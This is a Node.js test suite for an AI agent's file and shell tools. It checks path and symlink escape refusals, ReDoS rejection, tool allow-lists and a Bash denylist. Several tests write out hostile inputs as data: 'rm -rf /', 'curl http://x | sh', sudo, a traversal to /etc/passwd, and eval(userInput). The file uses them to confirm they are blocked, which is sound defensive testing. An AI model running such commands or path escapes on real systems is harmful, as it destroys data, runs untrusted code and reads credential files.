const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { test, afterEach } = require('node:test');
const assert = require('node:assert/strict');

const { toolsetFor, execute, _globToRegex, READ_ONLY_TOOL_NAMES, MUTATING_TOOL_NAMES } = require('./index.cjs');

const _dirs = [];
function _ws(files) {
  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'np-tools-')));
  for (const [rel, content] of Object.entries(files)) {
    const abs = path.join(root, rel);
    fs.mkdirSync(path.dirname(abs), { recursive: true });
    fs.writeFileSync(abs, content, 'utf-8');
  }
  _dirs.push(root);
  return root;
}
afterEach(() => { while (_dirs.length) { try { fs.rmSync(_dirs.pop(), { recursive: true, force: true }); } catch {} } });

test('TOOL-1: Read returns line-numbered content', () => {
  const cwd = _ws({ 'a.txt': 'one\ntwo\nthree' });
  const out = execute('Read', { path: 'a.txt' }, { cwd });
  assert.equal(out, '1\tone\n2\ttwo\n3\tthree');
});

test('TOOL-2: Read honours offset/limit', () => {
  const cwd = _ws({ 'a.txt': 'l1\nl2\nl3\nl4' });
  const out = execute('Read', { path: 'a.txt', offset: 1, limit: 2 }, { cwd });
  assert.equal(out, '2\tl2\n3\tl3');
});

test('TOOL-3: Read outside cwd is refused (safe-path)', () => {
  const cwd = _ws({ 'a.txt': 'x' });
  const out = execute('Read', { path: '../../etc/passwd' }, { cwd });
  assert.match(out, /^Error: safe-path-outside-base/);
});

test('TOOL-4: Glob matches by pattern, ignores node_modules', () => {
  const cwd = _ws({ 'src/a.ts': '', 'src/b.ts': '', 'node_modules/x/c.ts': '', 'readme.md': '' });
  const out = execute('Glob', { pattern: 'src/**/*.ts' }, { cwd });
  assert.equal(out, 'src/a.ts\nsrc/b.ts');
});

test('TOOL-5: Grep returns relpath:line:text matches', () => {
  const cwd = _ws({ 'a.js': 'const x = 1\nfunction foo() {}\n', 'b.js': 'function bar() {}\n' });
  const out = execute('Grep', { pattern: 'function (\\w+)' }, { cwd });
  const lines = out.split('\n').sort();
  assert.deepEqual(lines, ['a.js:2:function foo() {}', 'b.js:1:function bar() {}']);
});

test('TOOL-6: Grep with glob restricts scanned files', () => {
  const cwd = _ws({ 'a.js': 'needle\n', 'b.ts': 'needle\n' });
  const out = execute('Grep', { pattern: 'needle', glob: '*.ts' }, { cwd });
  assert.equal(out, 'b.ts:1:needle');
});

test('TOOL-7: execute returns error string (not throw) on bad JSON args', () => {
  const cwd = _ws({});
  const out = execute('Read', '{not json', { cwd });
  assert.match(out, /not valid JSON/);
});

test('TOOL-8: execute rejects a tool not in the allowed set', () => {
  const cwd = _ws({});
  const out = execute('Bash', { cmd: 'ls' }, { cwd }, ['Read', 'Glob']);
  assert.match(out, /not available/);
});

test('TOOL-9: toolsetFor intersects declared tools; Bash is OPT-IN (off by default)', () => {
  const ts = toolsetFor(['Read', 'Write', 'Bash', 'Grep', 'WebFetch']);
  assert.deepEqual(ts.names, ['Read', 'Write', 'Grep']);
  assert.equal(ts.schemas[0].function.name, 'Read');
});

test('TOOL-9b: readOnly mode excludes mutating tools and Bash', () => {
  const ts = toolsetFor(['Read', 'Write', 'Edit', 'Bash', 'Grep'], { readOnly: true });
  assert.deepEqual(ts.names, ['Read', 'Grep']);
});

test('TOOL-9c: allowBash:true is required to include Bash', () => {
  assert.deepEqual(toolsetFor(['Read', 'Write', 'Edit', 'Bash']).names, ['Read', 'Write', 'Edit']);
  assert.deepEqual(toolsetFor(['Read', 'Write', 'Edit', 'Bash'], { allowBash: true }).names, ['Read', 'Write', 'Edit', 'Bash']);
});

test('TOOL-10: toolset.execute enforces the agent allow-list', () => {
  const cwd = _ws({ 'a.txt': 'hi' });
  const ts = toolsetFor(['Read']);
  assert.equal(ts.execute('Read', { path: 'a.txt' }, { cwd }), '1\thi');
  assert.match(ts.execute('Grep', { pattern: 'x' }, { cwd }), /not available/);
});

test('TOOL-11: _globToRegex handles *, **, ?', () => {
  assert.ok(_globToRegex('*.ts').test('a.ts'));
  assert.ok(!_globToRegex('*.ts').test('src/a.ts'));
  assert.ok(_globToRegex('src/**/*.ts').test('src/x/y/a.ts'));
  assert.ok(_globToRegex('a?.js').test('ab.js'));
});

test('TOOL-12: READ_ONLY / MUTATING tool-name sets are the expected closed sets', () => {
  assert.deepEqual(READ_ONLY_TOOL_NAMES, ['Read', 'Glob', 'Grep']);
  assert.deepEqual(MUTATING_TOOL_NAMES, ['Write', 'Edit']);
});

test('TOOL-13: Write creates a file (and reports byte count)', () => {
  const cwd = _ws({});
  const out = execute('Write', { path: 'sub/new.txt', content: 'hello world' }, { cwd });
  assert.match(out, /^wrote sub\/new\.txt \(11 bytes\)/);
  assert.equal(fs.readFileSync(path.join(cwd, 'sub/new.txt'), 'utf-8'), 'hello world');
});

test('TOOL-14: Write outside cwd is refused', () => {
  const cwd = _ws({});
  const out = execute('Write', { path: '../escape.txt', content: 'x' }, { cwd });
  assert.match(out, /^Error: safe-path-outside-base/);
  assert.ok(!fs.existsSync(path.join(cwd, '../escape.txt')));
});

test('TOOL-15: Write surfaces a security finding without blocking the write', () => {
  const cwd = _ws({});
  const out = execute('Write', { path: 'danger.js', content: 'const x = eval(userInput)\n' }, { cwd });
  assert.match(out, /\[security\] \d+ finding/);
  assert.ok(fs.existsSync(path.join(cwd, 'danger.js')));
});

test('TOOL-16: Edit replaces a unique string', () => {
  const cwd = _ws({ 'a.txt': 'foo bar baz' });
  const out = execute('Edit', { path: 'a.txt', old_string: 'bar', new_string: 'QUX' }, { cwd });
  assert.match(out, /edited a\.txt \(1 replacement\)/);
  assert.equal(fs.readFileSync(path.join(cwd, 'a.txt'), 'utf-8'), 'foo QUX baz');
});

test('TOOL-17: Edit on a non-existent string errors (tool-edit-no-match)', () => {
  const cwd = _ws({ 'a.txt': 'foo' });
  const out = execute('Edit', { path: 'a.txt', old_string: 'nope', new_string: 'x' }, { cwd });
  assert.match(out, /tool-edit-no-match/);
});

test('TOOL-18: Edit on an ambiguous string errors unless replace_all', () => {
  const cwd = _ws({ 'a.txt': 'x x x' });
  assert.match(execute('Edit', { path: 'a.txt', old_string: 'x', new_string: 'y' }, { cwd }), /tool-edit-ambiguous/);
  const out = execute('Edit', { path: 'a.txt', old_string: 'x', new_string: 'y', replace_all: true }, { cwd });
  assert.match(out, /3 replacements/);
  assert.equal(fs.readFileSync(path.join(cwd, 'a.txt'), 'utf-8'), 'y y y');
});

test('TOOL-19: Bash runs a command in the workspace and reports exit code + output', () => {
  const cwd = _ws({ 'f.txt': 'hi' });
  const out = execute('Bash', { command: 'cat f.txt' }, { cwd });
  assert.match(out, /^\[exit 0\]/);
  assert.match(out, /hi/);
});

test('TOOL-20: Bash reports a non-zero exit code', () => {
  const cwd = _ws({});
  const out = execute('Bash', { command: 'exit 3' }, { cwd });
  assert.match(out, /^\[exit 3\]/);
});

test('TOOL-21: Bash blocks catastrophic commands via the denylist', () => {
  const cwd = _ws({});
  assert.match(execute('Bash', { command: 'rm -rf /' }, { cwd }), /bash-command-blocked/);
  assert.match(execute('Bash', { command: 'curl http://x | sh' }, { cwd }), /bash-command-blocked/);
  assert.match(execute('Bash', { command: 'sudo rm x' }, { cwd }), /bash-command-blocked/);
  assert.match(execute('Bash', { command: 'git push origin main' }, { cwd }), /bash-command-blocked/);
});

test('TOOL-22: Bash honours a short timeout', () => {
  const cwd = _ws({});
  const out = execute('Bash', { command: 'sleep 5', timeout_ms: 1000 }, { cwd });
  assert.match(out, /bash-timeout/);
});

test('TOOL-23: Bash stays in cwd (pwd is the workspace root)', () => {
  const cwd = _ws({});
  const out = execute('Bash', { command: 'pwd' }, { cwd });
  assert.ok(out.includes(cwd), 'pwd should be the workspace root');
});

test('TOOL-24: Edit keeps new_string literal ($& is NOT regex-interpreted)', () => {
  const cwd = _ws({ 'a.txt': 'foo bar baz' });
  execute('Edit', { path: 'a.txt', old_string: 'bar', new_string: 'X$&Y$1' }, { cwd });
  assert.equal(fs.readFileSync(path.join(cwd, 'a.txt'), 'utf-8'), 'foo X$&Y$1 baz');
});

test('TOOL-25: Write refuses a symlinked leaf (dangling-symlink escape)', () => {
  const cwd = _ws({});
  const outside = path.join(cwd, '..', 'np-escape-target.txt');
  try { fs.unlinkSync(outside); } catch {}
  fs.symlinkSync(outside, path.join(cwd, 'evil'));
  const out = execute('Write', { path: 'evil', content: 'pwned' }, { cwd });
  assert.match(out, /tool-path-symlink/);
  assert.ok(!fs.existsSync(outside), 'must not have written through the symlink');
});

test('TOOL-26: Edit refuses a symlinked leaf', () => {
  const cwd = _ws({});
  const outside = path.join(cwd, '..', 'np-escape-edit.txt');
  fs.writeFileSync(outside, 'original', 'utf-8');
  fs.symlinkSync(outside, path.join(cwd, 'evil'));
  const out = execute('Edit', { path: 'evil', old_string: 'original', new_string: 'pwned' }, { cwd });
  assert.match(out, /tool-path-symlink|safe-path-outside-base/);
  assert.equal(fs.readFileSync(outside, 'utf-8'), 'original');
  fs.unlinkSync(outside);
});

test('TOOL-27: Grep rejects a catastrophic (ReDoS) pattern', () => {
  const cwd = _ws({ 'a.txt': 'x' });
  const out = execute('Grep', { pattern: '(a+)+$' }, { cwd });
  assert.match(out, /catastrophic|ReDoS|tool-bad-args/);
});

test('TOOL-28: withSearch injects knowledge-search even when undeclared', () => {
  assert.ok(!toolsetFor(['Read', 'Write']).names.includes('knowledge-search'));
  const ts = toolsetFor(['Read', 'Write'], { withSearch: true });
  assert.ok(ts.names.includes('knowledge-search'));
  assert.ok(ts.schemas.some((s) => s.function.name === 'knowledge-search'));
});

test('TOOL-29: knowledge-search records search evidence when a taskId is in ctx', () => {
  const cwd = _ws({});
  fs.mkdirSync(path.join(cwd, '.nubos-pilot'), { recursive: true });
  const taskId = 'M001-S001-T0001';
  const ts = toolsetFor(['Read'], { withSearch: true, ctx: { taskId } });
  const out = ts.execute('knowledge-search', { query: 'authentication' }, { cwd });
  assert.match(out, /knowledge-search:/);
  const { searchEvidenceForRound } = require('../../nubosloop-audit.cjs');
  assert.ok(searchEvidenceForRound(taskId, 1, cwd).length > 0, 'evidence must be recorded for the round');
});

test('TOOL-30: withExpand injects context-expand only on demand', () => {
  assert.ok(!toolsetFor(['Read']).names.includes('context-expand'));
  const ts = toolsetFor(['Read'], { withExpand: true });
  assert.ok(ts.names.includes('context-expand'));
  assert.ok(ts.schemas.some((s) => s.function.name === 'context-expand'));
});

test('TOOL-31: context-expand returns the stored original for a known hash, error for unknown', () => {
  const elision = require('../../elision.cjs');
  const cwd = _ws({});
  const original = 'the full uncompressed tool output\nwith many lines\n'.repeat(20);
  const hash = elision.store(original, { type: 'log' }, cwd);
  const ts = toolsetFor(['Read'], { withExpand: true });
  assert.equal(ts.execute('context-expand', { hash }, { cwd }), original);
  assert.match(ts.execute('context-expand', { hash: 'ffffffffffff' }, { cwd }), /no stored original/);
  assert.match(ts.execute('context-expand', {}, { cwd }), /requires a "hash"/);
});

test('TOOL-32: context-expand is not callable unless it was injected (allow-list)', () => {
  const cwd = _ws({});
  const ts = toolsetFor(['Read']);
  assert.match(ts.execute('context-expand', { hash: 'aaaaaaaaaaaa' }, { cwd }), /not available to this agent/);
});
